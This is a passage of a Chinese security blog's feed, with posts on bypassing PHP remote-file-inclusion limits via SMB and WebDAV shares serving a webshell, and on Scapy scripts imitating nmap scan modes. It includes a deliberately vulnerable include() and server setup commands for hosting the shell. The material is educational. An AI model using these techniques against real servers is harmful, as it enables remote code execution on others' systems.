alt="image.png"></p><p>可以明显地看到另外一个<code>session</code>延时了5秒。</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.jianshu.com/p/458c246d79d4" title="https://www.jianshu.com/p/458c246d79d4" target="_blank" rel="noopener">https://www.jianshu.com/p/458c246d79d4</a><br><a href="http://www.w3school.com.cn/php/func_mysql_pconnect.asp" title="http://www.w3school.com.cn/php/func_mysql_pconnect.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_mysql_pconnect.asp</a><br><a href="https://www.cnblogs.com/cobbliu/p/3817370.html" title="https://www.cnblogs.com/cobbliu/p/3817370.html" target="_blank" rel="noopener">https://www.cnblogs.com/cobbliu/p/3817370.html</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 一些姿势 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bypass-RFI限制的一些思路</title>
      <link href="/2019/05/15/bypass-RFI%E9%99%90%E5%88%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/"/>
      <url>/2019/05/15/bypass-RFI%E9%99%90%E5%88%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>下面介绍的两个姿势都是先知群里面get到的，这里记录一下，给先知的师傅们倒茶。</p><h1 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h1><p>假设我们有一个这样的代码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"shell"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>我们发现通过<code>phpinfo</code>发现<code>allow_url_fopen=Off</code>和<code>allow_url_include=Off</code></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514222028-6c58eb54-7653-1.png" alt="image.png"></p><p>用常规的方法直接包含一个远程文件肯定是不行的</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514223651-b6220bf6-7655-1.png" alt="image.png"></p><p>所以我们得想办法绕过<code>allow_url_fopen=Off</code>和<code>allow_url_include=Off</code>的限制</p><h2 id="第一种姿势：利用SMB文件共享服务"><a href="#第一种姿势：利用SMB文件共享服务" class="headerlink" title="第一种姿势：利用SMB文件共享服务"></a>第一种姿势：利用<code>SMB</code>文件共享服务</h2><p>对于PHP而言即使<code>allow_url_include</code>和<code>allow_url_fopen</code>都设置为<code>Off</code>，PHP也会加载SMB URL。所以我们可以配合<code>SMB</code>远程加载我们的<code>webshell</code>，我们同时要设置<code>SMB</code>共享服务器允许外部访问我们的<code>webshell</code>文件，所以我们需要配置一个具有匿名浏览访问权限的SMB服务器，一旦受害者尝试访问我们的<code>SMB</code>服务器上的<code>webshell</code>，我们的<code>SMB</code>服务器将不会请求任何凭证，受害者就会包含我们的<code>SMB</code>服务器上的webshell文件</p><h3 id="SAMBA服务器配置"><a href="#SAMBA服务器配置" class="headerlink" title="SAMBA服务器配置"></a>SAMBA服务器配置</h3><blockquote><p>Samba是在Linux和UNIX系统上实现SMB协议的一个软件</p></blockquote><p>安装SAMBA</p><pre class=" language-sh"><code class="language-sh">apt-get install samba</code></pre><p>创建SMB共享目录</p><pre class=" language-sh"><code class="language-sh">mkdir /var/www/html/share/</code></pre><p>配置新创建的SMB共享目录的权限</p><pre class=" language-sh"><code class="language-sh">chmod 0555 /var/www/html/share/chown -R nobody:nogroup /var/www/html/share/</code></pre><p>清空<code>/etc/samba/smb.conf</code>文件中的内容</p><pre><code>echo &gt; /etc/samba/smb.conf</code></pre><p>将下面内容粘贴到<code>/etc/samba/smb.conf</code></p><pre><code>[global]workgroup = WORKGROUPserver string = Samba Server %vnetbios name = indishell-labsecurity = usermap to guest = bad username resolve order = bcast hostdns proxy = nobind interfaces only = yes[ica]path = /var/www/html/sharewritable = noguest ok = yesguest only = yesread only = yesdirectory mode = 0555force user = nobody</code></pre><p>重启<code>smb</code>服务</p><pre><code>service smbd restart</code></pre><p>然后访问一下，发现可以正常访问</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514222432-fe128316-7653-1.png" alt="image.png"></p><p><code>\\192.168.163.128\ica\shell.php</code>内容为：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514224804-47be592e-7657-1.png" alt="image.png"></p><p>尝试包含一波，成功包含</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514222633-460cdae0-7654-1.png" alt="image.png"></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>这种方法还是比较局限的，因为这种<code>unc</code>只能是在windows下使用，而且国内的运营商对<code>smb</code>还是比较敏感的，毕竟被勒索病毒搞怕了/捂脸。。。。。</p><h2 id="第二种姿势：利用webdav"><a href="#第二种姿势：利用webdav" class="headerlink" title="第二种姿势：利用webdav"></a>第二种姿势：利用webdav</h2><p><strong> PS：这个思路是Lz1y师傅在ph师傅小密圈提到的，tql </strong></p><p>用docker启动一个webdav服务器（ph师傅给的）</p><pre><code>docker run -v ~/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 80:80 --rm --name webdav bytemark/webdav</code></pre><p>然后把php文件放到<code>~/webdav/data</code>里面</p><p>尝试包含，包含成功<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190515001220-0d01bde2-7663-1.png" alt="image.png"><br>注意包含的路径是<code>//ip//webdav/shell.php</code>而不是<code>//ip/webdav/shell.php</code>，至于为什么呢我也不是很清楚，如果是用浏览器直接打开的话两种方式都可以，但是不知道为啥放在<code>php</code>上后者的那种方式就不行了，有知道的师傅还请不吝赐教。</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html" target="_blank" rel="noopener">http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 一些姿势 </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>运用Scapy编写类似于Nmap的端口扫描脚本</title>
      <link href="/2019/04/09/%E8%BF%90%E7%94%A8Scapy%E7%BC%96%E5%86%99%E7%B1%BB%E4%BC%BC%E4%BA%8ENmap%E7%9A%84%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E8%84%9A%E6%9C%AC/"/>
      <url>/2019/04/09/%E8%BF%90%E7%94%A8Scapy%E7%BC%96%E5%86%99%E7%B1%BB%E4%BC%BC%E4%BA%8ENmap%E7%9A%84%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<blockquote><p>文章首发于先知社区<a href="https://xz.aliyun.com/t/4704" target="_blank" rel="noopener">https://xz.aliyun.com/t/4704</a></p></blockquote><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Scapy是一种用于计算机网络的数据包处理工具，由Philippe Biondi 用Python编写。它可以伪造或解码数据包，在线路上发送它们，捕获它们，并匹配请求和回复。它还可以处理扫描，跟踪路由，探测，单元测试，攻击和网络发现等任务。可以说Scpay非常强大<br>如果您并不是很了解Scapy，可以自行去看一下官方文档和demo：<a href="https://scapy.readthedocs.io/en/latest/usage.html" title="链接" target="_blank" rel="noopener">链接</a>，因为这篇文章重点不是教您怎么用scapy的，所以这里就不多赘述了。</p><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><h2 id="TCP-Connect扫描"><a href="#TCP-Connect扫描" class="headerlink" title="TCP Connect扫描"></a>TCP Connect扫描</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>TCP Connect扫描又称全连接扫描，此过程客户端会和服务端进行完整的3次握手。假设客户端想与服务端的80端口进行通信，首先客户端会发送一个带有 SYN 标识和端口号的TCP数据包给服务器，如果服务器这个端口是开放的，则会接受这个连接并返回一个带有 SYN 和 ACK标识的数据包给客户端，随后客户端会发送带有 ACK  和 RST 标识的数据包给服务点，此时客户端与服务器建立了连接。如果端口不开放则会返回一个RST标识的数据包给客户端。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405222422-81f37ff6-57ae-1.png" alt="image.png"></p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>代码实现：</p><blockquote><p>nmap的-sT模式</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span>all <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> getopt<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">scan</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>    opts<span class="token punctuation">,</span> args <span class="token operator">=</span> getopt<span class="token punctuation">.</span>getopt<span class="token punctuation">(</span>argv<span class="token punctuation">,</span> <span class="token string">"-h:"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> opt<span class="token punctuation">,</span>arg <span class="token keyword">in</span> opts<span class="token punctuation">:</span>        <span class="token keyword">if</span> opt <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">"-h"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            host<span class="token operator">=</span>arg    all_port<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">3306</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> port <span class="token keyword">in</span> all_port<span class="token punctuation">:</span>        send<span class="token operator">=</span>sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>host<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span>port<span class="token punctuation">,</span>flags<span class="token operator">=</span><span class="token string">"S"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>send <span class="token keyword">is</span> None<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">"[+] %s %d \033[91m Closed \033[0m"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span>        <span class="token keyword">elif</span> send<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span><span class="token string">"TCP"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> send<span class="token punctuation">[</span><span class="token string">"TCP"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>flags <span class="token operator">==</span> <span class="token string">"SA"</span><span class="token punctuation">:</span>                send_1 <span class="token operator">=</span> sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>host<span class="token punctuation">)</span> <span class="token operator">/</span> TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span>port<span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"AR"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>                <span class="token keyword">print</span> <span class="token string">"[+] %s %d \033[92m Open \033[0m"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span>            <span class="token keyword">elif</span> send<span class="token punctuation">[</span><span class="token string">"TCP"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>flags <span class="token operator">==</span> <span class="token string">"RA"</span><span class="token punctuation">:</span>                <span class="token keyword">print</span> <span class="token string">"[+] %s %d \033[91m Closed \033[0m"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    scan<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>扫描结果如下：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405113642-0767efa6-5754-1.png" alt="image.png"></p><h2 id="TCP-SYN扫描"><a href="#TCP-SYN扫描" class="headerlink" title="TCP SYN扫描"></a>TCP SYN扫描</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>TCP SYN扫描又称半开式扫描，该过程不会和服务端建立完整的连接，首先客户端会发送一个带有 SYN 标识和端口号的TCP数据包给服务器，如果服务器这个端口是开放的，则会接受这个连接并返回一个带有 SYN 和ACK标识的数据包给客户端，随后客户端会返回带有 RST 标识的数据包而不是返回一个带有 ACK 和 RST标识的数据包。如果目标端口处于关闭状态，则服务端会返回一个 RST 标识的数据包。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405222531-aaf7001c-57ae-1.png" alt="image.png"></p><h3 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h3><p>代码实现，直接把TCP Connect扫描的改一行即可，把标识位改为 R</p><blockquote><p>nmap的-sS模式</p></blockquote><pre class=" language-python"><code class="language-python">send_1 <span class="token operator">=</span> sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>host<span class="token punctuation">)</span> <span class="token operator">/</span> TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span>port<span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"R"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><h2 id="TCP-ACK扫描-大多数情况下用于防火墙检测"><a href="#TCP-ACK扫描-大多数情况下用于防火墙检测" class="headerlink" title="TCP ACK扫描(大多数情况下用于防火墙检测)"></a>TCP ACK扫描(大多数情况下用于防火墙检测)</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>ACK 扫描不是用于发现端口开启或关闭状态的，而是用于发现服务器上是否存在有状态防火墙的，它的结果只能说明端口是否被过滤。如果你用nmap -sA就会发现他只会返回两种结果unfiltered和filtered，因为nmap -sA就是ACK扫描的。</p><p>判断端口是否被过滤，分为两种情况：</p><ul><li>发送一个flags为ACK报文，open(开放的)和closed(关闭的) 端口 都会返回RST报文，至于他们是open还是closed状态我们无法确定。不响应的端口，或者发送特定的ICMP错误消息(类型3，代号1，2，3，9，10， 或者13)的端口，标记为 filtered(被过滤的)。大致的流程如下图：</li></ul><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405220235-76a2ea9a-57ab-1.png" alt="image.png"></p><ul><li>上面那种情况下是服务器REJECT掉数据包，所以客户端会有个ICMP包返回，如果是直接DROP掉的话，就会什么也不会返回，所以我们要判断该主机是否存在，因为如果一个主机存在的话，向它发送一个flags为ACK包的话，无论端口是否关闭都会有返回一个flags为RST包，如果是DROP是话就会一个数据包都不会返回，所以我们可以利用这一点去判断端口是否被过滤了，大致流程如下：</li></ul><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405220808-3d219df6-57ac-1.png" alt="image.png"></p><h3 id="实现-2"><a href="#实现-2" class="headerlink" title="实现"></a>实现</h3><p>iptables配置如下</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405221110-a98ca6b6-57ac-1.png" alt="image.png"></p><p>代码实现</p><blockquote><p>nmap -sA模式</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span>all <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> getopt<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">scan</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>    opts<span class="token punctuation">,</span> args <span class="token operator">=</span> getopt<span class="token punctuation">.</span>getopt<span class="token punctuation">(</span>argv<span class="token punctuation">,</span> <span class="token string">"-h:"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> opt<span class="token punctuation">,</span>arg <span class="token keyword">in</span> opts<span class="token punctuation">:</span>        <span class="token keyword">if</span> opt <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">"-h"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            host<span class="token operator">=</span>arg    all_port<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">3306</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> port <span class="token keyword">in</span> all_port<span class="token punctuation">:</span>        send<span class="token operator">=</span>sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>host<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span>port<span class="token punctuation">,</span>flags<span class="token operator">=</span><span class="token string">"A"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span>verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> ping<span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span> <span class="token operator">and</span> send <span class="token keyword">is</span> None<span class="token punctuation">:</span> <span class="token operator">//</span>如果ping不通，则说明该主机处于关闭状态或我们是被过滤了            <span class="token keyword">print</span> <span class="token string">"[+] The host is \033[91m Died or filtered\033[0m"</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> ping<span class="token punctuation">(</span>host<span class="token punctuation">)</span> <span class="token operator">and</span> send <span class="token keyword">is</span> None<span class="token punctuation">:</span> <span class="token operator">//</span>如果ping得通且没有数据返回            <span class="token keyword">print</span> <span class="token string">"[+] %s %d \033[91m filtered \033[0m"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span>        <span class="token keyword">elif</span> send<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span><span class="token string">"ICMP"</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token operator">//</span>返回一个ICMP包            <span class="token keyword">if</span><span class="token punctuation">(</span>send<span class="token punctuation">[</span><span class="token string">"ICMP"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>type<span class="token operator">==</span><span class="token number">3</span> <span class="token operator">and</span> <span class="token punctuation">(</span>send<span class="token punctuation">[</span><span class="token string">"ICMP"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>code <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span> <span class="token string">"[+] %s %d \033[91m filtered \033[0m"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span>        <span class="token keyword">elif</span> send<span class="token punctuation">[</span><span class="token string">"TCP"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>flags<span class="token operator">==</span><span class="token string">"R"</span><span class="token punctuation">:</span> <span class="token operator">//</span>返回一个flags为RST的包            <span class="token keyword">print</span> <span class="token string">"[+] %s %d \033[91m unfiltered \033[0m"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ping</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token operator">//</span>ping判断主机是否存活    ping<span class="token operator">=</span>sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>host<span class="token punctuation">)</span><span class="token operator">/</span>ICMP<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">,</span>verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> ping <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">elif</span> ping <span class="token keyword">is</span> None<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    scan<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>扫描结果如下，我们可以明显地发现无论是REJECT或DROP都能检测出来</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405221254-e7be6532-57ac-1.png" alt="image.png"></p><h2 id="TCP-Window扫描"><a href="#TCP-Window扫描" class="headerlink" title="TCP Window扫描"></a>TCP Window扫描</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>它通过检查返回的RST报文的TCP窗口域做到这一点。 在某些系统上，开放端口用正数表示窗口大小(甚至对于RST报文) 而关闭端口的窗口大小为0。因此，当收到RST时，窗口扫描不总是把端口标记为 unfiltered， 而是根据TCP窗口值是正数还是0，分别把端口标记为open或者 closed。该扫描依赖于互联网上少数系统的实现细节， <strong>因此您不能永远相信它</strong> 。不支持它的系统会通常返回所有端口closed。 当然，一台机器没有开放端口也是有可能的。 如果大部分被扫描的端口是 closed，而一些常见的端口 (如 22， 25，53) 是 filtered，该系统就非常可疑了。 偶尔地，系统甚至会显示恰恰相反的行为。 如果您的扫描显示1000个开放的端口和3个关闭的或者被过滤的端口， 那么那3个很可能也是开放的端口。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405230731-893c9ecc-57b4-1.png" alt="image.png"></p><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><blockquote><p>nmap -sW模式</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span>all <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> getopt<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">scan</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>    opts<span class="token punctuation">,</span> args <span class="token operator">=</span> getopt<span class="token punctuation">.</span>getopt<span class="token punctuation">(</span>argv<span class="token punctuation">,</span> <span class="token string">"-h:"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> opt<span class="token punctuation">,</span>arg <span class="token keyword">in</span> opts<span class="token punctuation">:</span>        <span class="token keyword">if</span> opt <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">"-h"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            host<span class="token operator">=</span>arg    all_port<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">3306</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> port <span class="token keyword">in</span> all_port<span class="token punctuation">:</span>        send<span class="token operator">=</span>sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>host<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span>port<span class="token punctuation">,</span>flags<span class="token operator">=</span><span class="token string">"A"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>send <span class="token keyword">is</span> None<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">"[+] the host is\033[91m Closed or filtered\033[0m"</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> send<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span><span class="token string">"TCP"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> send<span class="token punctuation">[</span><span class="token string">"TCP"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>window <span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">print</span> <span class="token string">"[+] %s %d \033[92m Open \033[0m"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span>            <span class="token keyword">elif</span> send<span class="token punctuation">[</span><span class="token string">"TCP"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>window <span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">print</span> <span class="token string">"[+] %s %d \033[91m Closed \033[0m"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    scan<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>结果如下,为什么显示都是closed，这个因为系统的问题，如果你扫描windows的话都会显示open的，如果您认为是我写脚本错了的话，可以用nmap验证一下，<strong> 不建议使用这种模式，除非特殊情况 </strong></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405230001-7ceb0f10-57b3-1.png" alt="image.png"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405225923-6657c84c-57b3-1.png" alt="image.png"></p><h2 id="TCP-Null扫描"><a href="#TCP-Null扫描" class="headerlink" title="TCP Null扫描"></a>TCP Null扫描</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>在发送的数据包中不设置任何标志位(tcp标志头是0)，如果目标端口是开放的则不会回复任何信息。如果目标端口关闭则会返回一个RST+ACK的数据包，我在其它文章看到说是返回一个RST包，但是我用wireshark抓包nmap -sN的过程发现并不是这样子的，返回的是一个flags为RST+ACK的数据包</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405234850-4ea62804-57ba-1.png" alt="image.png"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405233409-4146681a-57b8-1.png" alt="image.png"></p><h2 id="实现-3"><a href="#实现-3" class="headerlink" title="实现"></a>实现</h2><blockquote><p>nmap -sN模式</p></blockquote><p>代码实现</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span>all <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> getopt<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">scan</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>    opts<span class="token punctuation">,</span> args <span class="token operator">=</span> getopt<span class="token punctuation">.</span>getopt<span class="token punctuation">(</span>argv<span class="token punctuation">,</span> <span class="token string">"-h:"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> opt<span class="token punctuation">,</span>arg <span class="token keyword">in</span> opts<span class="token punctuation">:</span>        <span class="token keyword">if</span> opt <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">"-h"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            host<span class="token operator">=</span>arg    all_port<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">3306</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> port <span class="token keyword">in</span> all_port<span class="token punctuation">:</span>        send<span class="token operator">=</span>sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>host<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span>port<span class="token 